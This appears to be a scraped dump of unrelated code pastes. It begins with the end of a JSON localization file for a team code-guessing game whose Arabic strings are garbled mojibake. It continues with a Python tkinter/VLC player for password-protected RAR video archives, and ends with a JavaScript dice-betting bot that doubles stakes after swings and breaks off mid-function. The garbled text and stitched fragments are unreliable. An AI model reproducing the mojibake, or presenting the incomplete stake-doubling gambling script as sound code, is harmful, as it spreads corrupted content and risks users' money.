    ""opposing_final_tiebreaker_guess_submitted"": ""ÿ™ŸÖ ÿßÿØÿÆŸÑ ÿ¢ÿÆÿ± ÿ™ŸàŸÇÿπ ŸÑŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ""
  },
  ""result_window"": {
    ""result_header"": ""ÿ±ŸÖÿ≤ ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""team_decoding"": ""ŸÅŸÉ ÿ¥ŸÅÿ±ÿ© ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""successful_decoding"": ""ŸÅŸÉ ÿ™ÿ¥ŸÅŸäÿ± ŸÜÿßÿ¨ÿ≠"",
    ""failed_decoding"": ""ŸÅŸÉ ÿ™ÿ¥ŸÅŸäÿ± ŸÅÿßÿ¥ŸÑ"",
    ""team_intercepting"": ""ÿ™ÿØÿÆŸÑ ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""successful_interception"": ""ÿ™ÿØÿÆŸÑ ŸÜÿßÿ¨ÿ≠"",
    ""failed_interception"": ""ÿ™ÿØÿÆŸÑ ŸÅÿßÿ¥ŸÑ"",
    ""final_code_reveal"": ""ÿßŸÑÿ±ŸÖÿ≤ ÿßŸÑÿµÿ≠Ÿäÿ≠ ŸáŸà""
  },
  ""tiebreaker_window"": {
    ""header_text"": ""ŸÜŸÇÿßÿ∑ ŸÉÿßÿ≥ÿ± ÿßŸÑÿ™ÿπÿßÿØŸÑ"",
    ""team_name"": ""ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""interceptions_label"": ""ÿßŸÑÿ™ÿØÿÆŸÑÿßÿ™"",
    ""miscommunications_label"": ""ÿ™ŸàÿßÿµŸÑ ŸÅÿßÿ¥ŸÑ"",
    ""final_score_label"": ""ÿßŸÑŸÜŸÇÿßÿ∑ ÿßŸÑŸÜŸáÿßÿ¶Ÿäÿ©""
  },
  ""final_tiebreaker_window"": {
    ""header_text"": ""ÿ¢ÿÆÿ± ŸÉÿßÿ≥ÿ± ÿßŸÑÿ™ÿπÿßÿØŸÑ"",
    ""main_text"": ""ÿØŸàÿ± ÿ¢ÿÆÿ± ŸÉÿßÿ≥ÿ± ÿßŸÑÿ™ÿπÿßÿØŸÑ"",
    ""description_test"": ""ÿÆŸÖŸÜ ÿßŸÑŸÉŸÑŸÖÿßÿ™ ÿßŸÑÿ≥ÿ±Ÿäÿ© ÿßŸÑÿÆÿßÿµÿπ ÿ®ÿßŸÑŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ""
  },
  ""final_tiebreaker_reveal"": {
    ""header_text"": ""ÿ¢ÿÆÿ± ŸÉÿßÿ≥ÿ± ÿ™ÿπÿßÿØŸÑ"",
    ""team_guesses"": ""ÿ™ÿÆŸÖŸäŸÜÿßÿ™ ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""guess_label_1"": ""ÿ™ÿÆŸÖŸäŸÜ ÿßŸàŸÑ ŸÉŸÑŸÖÿ©"",
    ""guess_label_2"": ""ÿ™ÿÆŸÖŸäŸÜ ÿ´ÿßŸÜŸä ŸÉŸÑŸÖÿ©"",
    ""guess_label_3"": ""ÿ™ÿÆŸÖŸäŸÜ ÿ´ÿßŸÑÿ´ ŸÉŸÑŸÖÿ©"",
    ""guess_label_4"": ""ÿ™ÿÆŸÖŸäŸÜ ÿ±ÿßÿ®ÿπ ŸÉŸÑŸÖÿ©"",
    ""correct_word"": ""ŸÉŸÑŸÖÿ© ÿµÿ≠Ÿäÿ≠Ÿá"",
    ""score_label"": ""ÿßŸÑŸÜŸÇÿßÿ∑ ÿßŸÑŸÜŸáÿßÿ¶Ÿäÿ©""
  },
  ""end_game"": {
    ""header_text"": ""ÿßŸÜÿ™Ÿáÿ™ ÿßŸÑÿπÿπÿ®ÿ©"",
    ""team_won"": ""ŸÅÿßÿ≤ ÿßŸÑŸÅÿ±ŸäŸÇ %s"",
    ""tie_text"": ""ŸáŸÜÿßŸÉ ÿ™ÿπÿßÿØŸÑ"",
    ""tie_message"": ""ÿ™ŸàŸÇÿπ ÿßŸÑŸÅÿ±ŸäŸÇŸäŸÜ ŸÜŸÅÿ≥ ÿßŸÑÿπÿØÿØ ŸÖŸÜ ÿßŸÑŸÉŸÑŸÖÿßÿ™"",
    ""win_reason"": {
      ""interceptions"": ""ÿ≠ÿµŸÑ ÿßŸÑŸÅÿ±ŸäŸÇ %s ÿπŸÑŸâ ÿπŸÖŸÑÿ™ŸäŸÜ ÿ™ÿØÿÆŸÑ"",
      ""miscommunications"": ""ÿ≠ÿµŸÑ ÿßŸÑŸÅÿ±ŸäŸÇ %s ÿπŸÑŸâ ÿπŸÖŸÑŸäŸÜ ŸÜŸàÿßÿµŸÑ ŸÅÿßÿ¥ŸÑ"",
      ""tiebreaker"": ""The %s team got the highest score in the tiebreaker"",
      ""final_tiebreaker"": ""The %s team guessed more words correctly in the final tiebreaker""
    }
  },
  ""components"": {
    ""interception_token_name"": ""Interception token"",
    ""interception_token_name_description"": ""Your team wins the game if it gets two of these"",
    ""miscommunication_token_name"": ""Miscommunication token"",
    ""miscommunication_token_description"": ""Your team loses the game if it gets two of these""
  },
  ""instructions"": {
    ""header_text"": ""Instructions"",
    ""first_round"": ""Your team has <b>four secret words</b> numbered 1 through 4, visible in the panels at the center of the table.\n\nOn each round, in each team, there will be an <b>encryptor</b> that has a <b>secret three digit code</b>. His goal is to give three clues, each related to the respective numbered secret word. Your team's goal is to <b>decrypt</b> the clues, guessing the encryptor's three digid code.\n\nThe clues have to relate to the <b>meaning</b> of the words, and not the word itself."",
    ""second_round"": ""In this round, and every other, you'll also know the <b>opposing team's encryptor clues</b>, giving you the opportunity to try to <b>intercept</b> their secret code.\n\nYou team's first intercept attempt will probably miss, but <b>with every clue</b> they give you'll be <b>narrowing down</b> their four words, making it easier to intercept.\n\nYour team <b>wins</b> the game by performing <b>two interceptions</b>.\nAlternatively your team <b>loses</b> the game by failing <b>two decryptions</b>.""
  },
  ""words"": [
    ""ÿ£ŸÅÿ±ŸäŸÇÿ®ÿß"",
    ""ÿπŸÖŸäŸÑ"",
    ""ŸáŸàÿßÿ°"",
    ""ŸÅÿ∂ÿßÿ¶Ÿä"",
    ""ÿ£ŸÖÿßÿ≤ŸàŸÜ"",
    ""ÿ•ÿ≥ÿπÿßŸÅ"",
    ""ÿ£ŸÖÿ±ŸäŸÉÿß"",
    ""ŸÖŸÑÿßŸÉ"",
    ""ÿ∞ÿ±ÿßÿπ"",
    ""ÿ£ÿ≥ÿ™ÿ±ÿßŸÑŸäÿß"",
    ""ÿ∏Ÿáÿ±"",
    ""ŸÉÿ±ÿ©"",
    ""ŸÅÿ±ŸÇÿ©"",
    ""ÿ®ŸÜŸÉ"",
    ""ŸÜÿ®ÿßÿ≠"",
    ""ÿÆŸÅÿßÿ¥"",
    ""ÿ®ÿ∑ÿßÿ±Ÿäÿ©"",
    ""ÿ¥ÿßÿ∑ÿ¶"",
    ""ÿØÿ®"",
    ""ÿ∂ÿ±ÿ®"",
    ""ÿ≥ÿ±Ÿäÿ±"",
    ""ÿ¨ÿ±ÿ≥"",
    ""ÿ≠ÿ≤ÿßŸÖ"",
    ""ÿ®ÿ±ŸÑŸäŸÜ"",
    ""ŸÅÿßÿ™Ÿàÿ±ÿ©"",
    ""ÿ≠ÿßÿ¨ÿ≤"",
    ""ÿ®ÿ±ÿ∫Ÿä"",
    ""ŸÇŸÜÿ®ŸÑÿ©"",
    ""ÿ±ÿßÿ®ÿ∑"",
    ""ÿ≠ÿ∞ÿßÿ°"",
    ""ŸÇÿßÿ±Ÿàÿ±ÿ©"",
    ""ŸÇŸàÿ≥"",
    ""ÿµŸÜÿØŸàŸÇ"",
    ""ÿÆÿ®ÿ≤"",
    ""ÿ¨ÿ≥ÿ±"",
    ""ŸÅÿ±ÿ¥ÿ©"",
    ""ÿ≠ÿ¥ÿ±ÿ©"",
    ""ÿ≤ÿ±"",
    ""ÿπÿ¨ŸÑ"",
    ""ŸÉŸÜÿØÿß"",
    ""ÿπÿßÿµŸÖÿ©"",
    ""ÿ≥Ÿäÿßÿ±ÿ©"",
    ""ÿ®ÿ∑ÿßŸÇÿ©"",
    ""ÿ¨ÿ≤ÿ±"",
    ""ŸÉÿßÿ≤ŸäŸÜŸà"",
    ""ŸÇÿ∑ÿ©"",
    ""ÿÆŸÑŸäÿ©"",
    ""ŸÇŸÜÿ∑Ÿàÿ±"",
    ""ŸÖÿ±ŸÉÿ≤"",
    ""ŸÉÿ±ÿ≥Ÿä"",
    ""ÿ¥ÿ®ÿßÿ®"",
    ""ÿ¥ÿ≠ŸÜ"",
    ""ÿ¥ŸäŸÉ"",
    ""ÿπŸÑÿ®ÿ©"",
    ""ÿØÿ¨ÿßÿ¨"",
    ""ÿßŸÑÿµŸäŸÜ"",
    ""ÿ¥ŸàŸÉŸàŸÑÿßÿ™ÿ©"",
    ""ŸÉŸÜŸäÿ≥ÿ©"",
    ""ÿØÿßÿ¶ÿ±ÿ©"",
    ""ŸáÿßŸàŸäÿ©"",
    ""ÿπÿ®ÿßÿ°ÿ©"",
    ""ŸÜÿßÿØŸä"",
    ""ÿ±ŸÖÿ≤"",
    ""ÿ®ÿ±ÿØ"",
    ""ÿµÿ≠ŸäŸÅÿ©"",
    ""ŸÖÿ±ŸÉÿ®"",
    ""ÿ™ÿ¨ŸÖÿπ"",
    ""ÿπŸÇÿØ"",
    ""ÿ∑ÿ®ÿÆ"",
    ""ŸÜÿ≠ÿßÿ≥"",
    ""ŸÇÿ∑ŸÜ"",
    ""ŸÖÿ≠ŸÉŸÖÿ©"",
    ""ÿ±ÿßŸÅÿπÿ©"",
    ""ÿ≠ÿ∑ÿßŸÖ"",
    ""ÿµÿ±ÿµÿßÿ±"",
    ""ÿ™ÿßÿ¨"",
    ""ÿØŸàÿ±ÿ©"",
    ""ÿ±ŸÇÿµ"",
    ""ŸäŸàŸÖ"",
    ""ŸÖŸàÿ™"",
    ""ÿØÿ±ÿ¨ÿ©"",
    ""ÿßŸÑŸÖÿßÿ≥"",
    ""ÿØŸäŸÜÿßÿµŸàÿ±"",
    ""ŸÖÿ±ÿ∂"",
    ""ÿ∫Ÿàÿßÿµ"",
    ""ÿ∑ÿ®Ÿäÿ®"",
    ""ŸÉŸÑÿ®"",
    ""ŸÖÿ≥ŸàÿØÿ©"",
    ""ÿ™ŸÜŸäŸÜ"",
    ""ÿ±ÿØÿßÿ°"",
    ""ÿ≥ÿßÿ¶ŸÇ"",
    ""Ÿäÿ≥ŸÇÿ∑"",
    ""ÿ®ÿ∑ÿ©"",
    ""ŸÇÿ≤ŸÖ"",
    ""ŸÜÿ≥ÿ±"",
    ""ŸÖÿµÿ±"",
    ""ÿ≥ŸÅÿßÿ±ÿ©"",
    ""ŸÖÿ≠ÿ±ŸÉ"",
    ""ÿ£Ÿàÿ±Ÿàÿ®ÿß"",
    ""ÿπŸäŸÜ"",
    ""Ÿàÿ¨Ÿá"",
    ""ÿπÿØŸÑ"",
    ""ÿÆÿ±ŸäŸÅ"",
    ""ŸÖÿ±Ÿàÿ≠ÿ©"",
    ""ÿ≥Ÿàÿ±"",
    ""ÿ≠ŸÇŸÑ"",
    ""ŸÖŸÇÿßÿ™ŸÑ"",
    ""ŸÖŸÑŸÅ"",
    ""ŸÅŸäŸÑŸÖ"",
    ""ŸÜÿßÿ±"",
    ""ÿ≥ŸÖŸÉ"",
    ""ŸÖÿ≤ŸÖÿßÿ±"",
    ""ÿ∑Ÿäÿ±ÿßŸÜ"",
    ""ŸÇÿØŸÖ"",
    ""ŸÇŸàÿ©"",
    ""ÿ∫ÿßÿ®ÿ©"",
    ""ÿ¥ŸàŸÉÿ©"",
    ""ŸÅÿ±ŸÜÿ≥ÿß"",
    ""ŸÑÿπÿ®ÿ©"",
    ""ÿ∫ÿßÿ≤"",
    ""ÿπÿ®ŸÇÿ±Ÿä"",
    ""ÿ£ŸÑŸÖÿßŸÜŸäÿß"",
    ""ÿ¥ÿ®ÿ≠"",
    ""ÿπŸÖŸÑÿßŸÇ"",
    ""ÿ≤ÿ¨ÿßÿ¨"",
    ""ŸÇŸÅÿßÿ≤"",
    ""Ÿäÿ∞Ÿáÿ®"",
    ""ÿ∞Ÿáÿ®"",
    ""ÿπÿ¥ÿ®"",
    ""ÿ£ÿÆÿ∂ÿ±"",
    ""ÿ£ÿ±ÿ∂Ÿä"",
    ""ŸäÿØ"",
    ""ÿµŸÇÿ±"",
    ""ÿ±ÿ£ÿ≥"",
    ""ŸÇŸÑÿ®"",
    ""ŸáŸÑŸäŸÉŸàÿ®ÿ™ÿ±"",
    ""ÿ´ŸÇÿ®"",
    ""ŸáŸàŸÑŸäŸàŸàÿØ"",
    ""ÿπÿ≥ŸÑ"",
    ""ÿ∫ÿ∑ÿßÿ°"",
    ""ÿÆÿ∑ÿßŸÅ"",
    ""ÿ®ŸàŸÇ"",
    ""ÿ≠ÿµÿßŸÜ"",
    ""ÿ≠ÿØŸàÿ©"",
    ""ŸÖÿ≥ÿ™ÿ¥ŸÅŸâ"",
    ""ŸÅŸÜÿØŸÇ"",
    ""ÿ¨ŸÑŸäÿØ"",
    ""ÿ®Ÿàÿ∏ÿ©"",
    ""ÿßŸÑŸáŸÜÿØ"",
    ""ÿ≠ÿØŸäÿØ"",
    ""ÿπÿßÿ¨"",
    ""ŸÖÿ±ÿ®Ÿâ"",
    ""ÿßŸÑŸÖÿ¥ÿ™ÿ±Ÿä"",
    ""ŸÉŸÜÿ∫ÿ±"",
    ""ŸÉÿßÿ™ÿ¥ÿ®"",
    ""ŸÖŸÅÿ™ÿßÿ≠"",
    ""ÿ∑ŸÅŸÑ"",
    ""ŸÖŸÑŸÉ"",
    ""ŸÉŸäŸàŸä"",
    ""ÿ≥ŸÉŸäŸÜ"",
    ""ŸÅÿßÿ±ÿ≥"",
    ""ŸÖÿÆÿ™ÿ®ÿ±"",
    ""ŸÖÿ≠ÿßŸÖŸä"",
    ""ÿ±ÿµÿßÿµ"",
    ""ŸÑŸäŸÖŸàŸÜ"",
    ""ÿ¨ŸÜŸä"",
    ""ÿ≠Ÿäÿßÿ©"",
    ""ÿ∂Ÿàÿ°"",
    ""ŸÑŸäŸÖŸàÿ≤ŸäŸÜ"",
    ""ÿÆÿ∑"",
    ""ÿ£ÿ≥ÿØ"",
    ""ŸÇŸÖÿßŸÖÿ©"",
    ""ŸÇŸÅŸÑ"",
    ""ÿ≥ÿ¨ŸÑ"",
    ""ŸÑŸÜÿØŸÜ"",
    ""ÿ≠ÿ∏"",
    ""ÿ®ÿ±ŸäÿØ"",
    ""ŸÖÿßŸÖŸàÿ´"",
    ""ÿ±ÿÆÿßŸÖ"",
    ""ŸÖÿ≥Ÿäÿ±ÿ©"",
    ""ŸÉÿ™ŸÑÿ©"",
    ""ÿ≤ÿ¶ÿ®ŸÇ"",
    ""ÿßŸÑŸÖŸÉÿ≥ŸäŸÉ"",
    ""ŸÖÿ¨Ÿáÿ±"",
    ""ŸÖŸÑŸäŸàŸÜŸäÿ±"",
    ""ŸÖŸÜÿ¨ŸÖ"",
    ""ŸÜÿπŸÜÿßÿπ"",
    ""ÿµÿßÿ±ŸàÿÆ"",
    ""ŸÜŸÖŸàÿ∞ÿ¨"",
    ""ŸÇŸÖÿ±"",
    ""ŸÖŸàÿ≥ŸÉŸà"",
    ""ÿ±ŸÉŸàÿ®"",
    ""ŸÅÿ£ÿ±"",
    ""ŸÅŸÖ"",
    ""ŸÇÿØÿ≠"",
    ""ŸÖÿ≥ŸÖÿßÿ±"",
    ""ÿ•ÿ®ÿ±ÿ©"",
    ""ŸÜŸäŸàŸäŸàÿ±ŸÉ"",
    ""ŸÑŸäŸÑ"",
    ""ŸÜŸäŸÜÿ¨ÿß"",
    ""ÿ±ŸàÿßŸäÿ©"",
    ""ŸÖŸÖÿ±ÿ∂ÿ©"",
    ""ÿ®ŸÜÿØŸÇ"",
    ""ÿ£ÿÆÿ∑ÿ®Ÿàÿ∑"",
    ""ÿ≤Ÿäÿ™"",
    ""ÿ≤Ÿäÿ™ŸàŸÜ"",
    ""ÿ£Ÿàÿ®ÿ±ÿß"",
    ""ÿ®ÿ±ÿ™ŸÇÿßŸÑ"",
    ""ÿπÿ∂Ÿà"",
    ""ŸÜÿÆŸÑ"",
    ""ÿ®ŸÜÿ∑ÿßŸÑ"",
    ""Ÿàÿ±ŸÇ"",
    ""ÿßŸÑŸÖÿ∏ŸÑÿ©"",
    ""ÿ≠ÿØŸäŸÇÿ©"",
    ""ÿ¨ÿ≤ÿ°"",
    ""ŸäŸÖÿ±"",
    ""ŸÖÿπÿ¨ŸàŸÜ"",
    ""ÿ®ÿ∑ÿ±ŸäŸÇ"",
    ""ŸÅŸäŸÜŸäŸÉÿ≥"",
    ""ÿ®ŸäÿßŸÜŸà"",
    ""ÿ∑Ÿäÿßÿ±"",
    ""ŸÖÿ∂ÿÆÿ©"",
    ""ŸÇÿ±ÿµÿßŸÜ"",
    ""ŸÖÿ≥ÿØÿ≥"",
    ""ÿ≠ŸÅÿ±ÿ©"",
    ""ŸÜÿ∫ŸÖÿ©"",
    ""ÿ∑ÿßÿ¶ÿ±ÿ©"",
    ""ÿ®ŸÑÿßÿ≥ÿ™ŸäŸÉ"",
    ""ÿ∑ÿ®ŸÇ"",
    ""ŸÑÿπÿ®"",
    ""ÿ≠ÿ®ŸÉÿ©"",
    ""ŸÜŸÇÿ∑ÿ©"",
    ""ÿ≥ŸÖ"",
    ""ÿπŸÖŸàÿØ"",
    ""ÿ¥ÿ±ÿ∑ÿ©"",
    ""ŸÖÿ≥ÿ®ÿ≠"",
    ""ŸÖŸäŸÜÿßÿ°"",
    ""ÿ®ÿ±ŸäÿØ"",
    ""Ÿäÿ∂ÿπÿ∑"",
    ""ÿ£ŸÖŸäÿ±ÿ©"",
    ""ÿ≠ÿßŸÜÿ©"",
    ""ŸäŸÇÿ∑ŸäŸÜ"",
    ""ÿ™ŸÑŸÖŸäÿ∞"",
    ""Ÿáÿ±ŸÖ"",
    ""ÿ£ÿ±ŸÜÿ®"",
    ""ÿ¥ÿπÿßÿπ"",
    ""ÿ´Ÿàÿ±ÿ©"",
    ""ÿµÿÆÿ±"",
    ""ÿ±ŸàŸÖÿß"",
    ""ÿ¨ÿ∞ÿ±"",
    ""Ÿàÿ±ÿØ"",
    ""ÿ±ŸàŸÑŸäÿ™"",
    ""ÿØŸàÿ±"",
    ""ÿµŸÅ"",
    ""ŸÖÿ≥ÿ∑ÿ±ÿ©"",
    ""ŸÇŸÖÿ±"",
    ""ÿ≤ÿ≠ŸÑ"",
    ""ŸÖŸäÿ≤ÿßŸÜ"",
    ""ŸÖÿØÿ±ÿ≥ÿ©"",
    ""ÿπÿßŸÑŸÖ"",
    ""ÿπŸÇÿ±ÿ®"",
    ""ÿ¥ÿßÿ¥ÿ©"",
    ""ÿÆÿ™ŸÖ"",
    ""ÿÆÿßÿØŸÖ"",
    ""ÿ∏ŸÑ"",
    ""ÿ¥ŸÉÿ≥ÿ®Ÿäÿ±"",
    ""ŸÇÿ±ÿ¥"",
    ""ÿ≥ŸÅŸäŸÜÿ©"",
    ""ÿ≠ÿ∞ÿßÿ°"",
    ""ÿ≥ŸàŸÇ"",
    ""ÿ∑ŸÑŸÇÿ©"",
    ""ÿ≠Ÿàÿ∂"",
    ""ŸÖŸáÿ±ÿ®"",
    ""ÿ´ŸÑÿ¨"",
    ""ÿ¨Ÿàÿ±ÿ®"",
    ""ÿ¨ŸÜÿØŸä"",
    ""ÿ±Ÿàÿ≠"",
    ""ÿµŸàÿ™"",
    ""ŸÅÿ∂ÿßÿ°"",
    ""ÿ™ÿπŸàŸäÿ∞ÿ©"",
    ""ÿπŸÜŸÉÿ®Ÿàÿ™"",
    ""Ÿäÿ±ÿ™ŸÇÿπ"",
    ""ÿ®ŸÇÿπÿ©"",
    ""ÿ±ÿ®Ÿäÿπ"",
    ""ÿ¨ÿßÿ≥Ÿàÿ≥"",
    ""ŸÖÿ±ÿ®ÿπ"",
    ""ŸÖŸÑÿπÿ®"",
    ""ÿ∑ÿßŸÇŸÖ"",
    ""ŸÜÿ¨ŸÖ"",
    ""ÿ≠ÿßŸÑÿ©"",
    ""ÿπÿµÿß"",
    ""ŸÖÿÆÿ≤ŸàŸÜ"",
    ""ŸÇÿ¥"",
    ""ÿ™ÿØŸÅŸÇ"",
    ""ÿ•ÿ∂ÿ±ÿßÿ®"",
    ""ÿÆŸäÿ∑"",
    ""ÿ®ÿØŸÑÿ©"",
    ""ÿÆÿßÿ±ŸÇ"",
    ""ÿ£ÿ±ÿ¨Ÿàÿ≠ÿ©"",
    ""ÿ∑ÿßŸàŸÑÿ©"",
    ""ÿ¥ÿπÿßÿ±"",
    ""ÿ∞ŸäŸÑ"",
    ""ŸÜŸÇÿ±"",
    ""ŸÖÿØÿ±ÿ≥"",
    ""ÿ™ŸÑÿ≥ŸÉŸàÿ®"",
    ""ŸÖÿ≤ÿßÿ¨"",
    ""ŸÖÿ≥ÿ±ÿ≠"",
    ""ŸÑÿµ"",
    ""ÿ•ÿ®ŸáÿßŸÖ"",
    ""ÿ™ÿπÿßÿØŸÑ"",
    ""ŸàŸÇÿ™"",
    ""ŸÖÿ±ÿ≠ÿßÿ∂"",
    ""ÿ∑ŸàŸÉŸäŸà"",
    ""ÿ≥ŸÜ"",
    ""ÿ¥ÿπŸÑÿ©"",
    ""ÿ®ÿ±ÿ¨"",
    ""ŸÖÿ≥ÿßÿ±"",
    ""ŸÇÿ∑ÿßÿ±"",
    ""ŸÖÿ´ŸÑÿ´"",
    ""ÿ±ÿ≠ŸÑÿ©"",
    ""ÿ¨ÿ∞ÿπ"",
    ""ÿ£ŸÜÿ®Ÿàÿ®"",
    ""ÿ™ÿ±ŸÉŸäÿß"",
    ""ŸÖŸÉŸÜÿ≥ÿ©"",
    ""ÿ®Ÿäÿ∑ÿ±Ÿä"",
    ""ÿ≥Ÿáÿ±"",
    ""ÿ¨ÿØÿßÿ±"",
    ""ÿ≠ÿ±ÿ®"",
    ""ÿ∫ÿ≥ÿßŸÑÿ©"",
    ""Ÿàÿßÿ¥ŸÜÿ∑ŸÜ"",
    ""ÿ≠ÿßÿ±ÿ≥"",
    ""ŸÖŸàÿ¨ÿ©"",
    ""ÿ¥ÿ®ŸÉÿ©"",
    ""ÿ¨ŸäÿØ"",
    ""ÿ≠Ÿàÿ™"",
    ""ÿ≥Ÿàÿ∑"",
    ""ÿ±Ÿäÿßÿ≠"",
    ""ÿ≥ÿßÿ≠ÿ±ÿ©"",
    ""ÿØŸàÿØÿ©"",
    ""ŸÅŸÜÿßÿ°""
  ]
}"
gRcSS1ky,VIDEO-RAR-PLAYER.pyw,Najeebsk,Python,Saturday 25th of May 2024 08:19:04 AM CDT,"import tkinter as tk
from tkinter import ttk, filedialog
import vlc
import rarfile
import tempfile
import shutil

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  
        self.player = self.instance.media_player_new()

        self.main_frame = tk.Frame(root, bg=""#4a4a4a"")
        self.main_frame.pack(fill=""both"", expand=True)

        # Add title label with custom font and color
        #self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=""blue"")
        #self.title_label.pack(pady=5)
        
        # Add password entry
        tk.Label(root, text=""Password:"", bg=""#4a4a4a"", fg=""white"").place(x=10, y=10)
        self.password_entry = tk.Entry(root, show='*', bg=""#4a4a4a"", fg=""white"")
        self.password_entry.place(x=80, y=10)

        # Add file browse button
        tk.Label(root, text=""Select RAR File:"", bg=""#4a4a4a"", fg=""white"").place(x=220, y=10)
        self.rar_entry = tk.Entry(root, bg=""#4a4a4a"", fg=""white"")
        self.rar_entry.place(x=320, y=10)
        self.browse_rar_button = tk.Button(root, text=""Browse"", command=self.browse_file, bg=""#FFA500"", fg=""white"")
        self.browse_rar_button.place(x=460, y=8)

        # Dropdown list for videos
        tk.Label(root, text=""Select Video from RAR:"", bg=""#4a4a4a"", fg=""white"").place(x=530, y=10)
        self.video_dropdown = ttk.Combobox(root, state=""readonly"")
        self.video_dropdown.place(x=670, y=10, width=200)
        self.video_dropdown.bind(""<<ComboboxSelected>>"", lambda e: self.show_video())

        self.button_frame = tk.Frame(self.main_frame, bg=""#4a4a4a"")
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=""#008000"", fg=""white"")
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=""#FF0000"", fg=""white"")
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_video, bg=""#5a5a5a"", fg=""white"")
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_video, bg=""#5a5a5a"", fg=""white"")
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.player_position = tk.Scale(self.button_frame, from_=0, to=100, orient=""horizontal"", command=self.set_position, length=400, bg=""#4a4a4a"", fg=""white"")
        self.player_position.pack(side=""left"", fill=""x"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=""#4a4a4a"", fg=""white"")
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame, bg=""#4a4a4a"")
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.video_list = []

    def browse_file(self):
        file_path = filedialog.askopenfilename(filetypes=[(""RAR files"", ""*.rar"")])
        if file_path:
            self.rar_entry.delete(0, tk.END)
            self.rar_entry.insert(0, file_path)
            self.load_videos_from_rar(file_path)

    def load_videos_from_rar(self, rar_path):
        password = self.password_entry.get()
        try:
            with rarfile.RarFile(rar_path) as rf:
                if password:
                    rf.setpassword(password)
                self.video_list = [f.filename for f in rf.infolist() if f.filename.endswith(('.mp4', '.mkv', '.avi'))]
                self.video_list.sort()
                self.video_dropdown['values'] = self.video_list
                self.current_rar_path = rar_path
                self.current_password = password
                self.current_video_label.config(text=""Videos loaded. Select a video."")
        except rarfile.BadRarFile:
            self.current_video_label.config(text=""Failed to open RAR file."")
        except rarfile.RarWrongPassword:
            self.current_video_label.config(text=""Incorrect password."")

    def play_video(self):
        if self.player.get_state() == vlc.State.Ended:
            self.player.stop()
        self.player.play()
        self.current_video_label.config(text=""Video playing"")

    def show_video(self):
        video_name = self.video_dropdown.get()
        if video_name:
            with rarfile.RarFile(self.current_rar_path) as rf:
                if self.current_password:
                    rf.setpassword(self.current_password)
                with tempfile.NamedTemporaryFile(delete=False) as temp_video:
                    with rf.open(video_name) as source_file:
                        shutil.copyfileobj(source_file, temp_video)
                    temp_video_path = temp_video.name

            media = self.instance.media_new(temp_video_path)
            self.player.set_media(media)
                
            if self.player_frame.winfo_children():
                self.player_frame.winfo_children()[0].destroy()

            self.player_frame.update()
            self.player.set_hwnd(self.player_frame.winfo_id())
            self.play_video()
            self.current_video_label.config(text=""Current video: "" + video_name)

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def prev_video(self):
        current_index = self.video_list.index(self.video_dropdown.get())
        prev_index = current_index - 1 if current_index > 0 else len(self.video_list) - 1
        self.video_dropdown.current(prev_index)
        self.show_video()

    def next_video(self):
        current_index = self.video_list.index(self.video_dropdown.get())
        next_index = (current_index + 1) % len(self.video_list)
        self.video_dropdown.current(next_index)
        self.show_video()

    def set_position(self, value):
        self.player.set_position(float(value) / 100)

root = tk.Tk()
root.geometry(""960x660"")
root.title(""Najeeb VLC Player"")
root.configure(bg=""#4a4a4a"")
video_player = VideoPlayer(root)
root.mainloop()
"
iCRyfbwu,snowybot 2000,coinwalk,JavaScript,Saturday 25th of May 2024 08:17:06 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/240).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var winnerdinner = (elderly*1.9);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var fart = 1;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great<=(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great>=(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (((great/40)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*fart)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 1;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
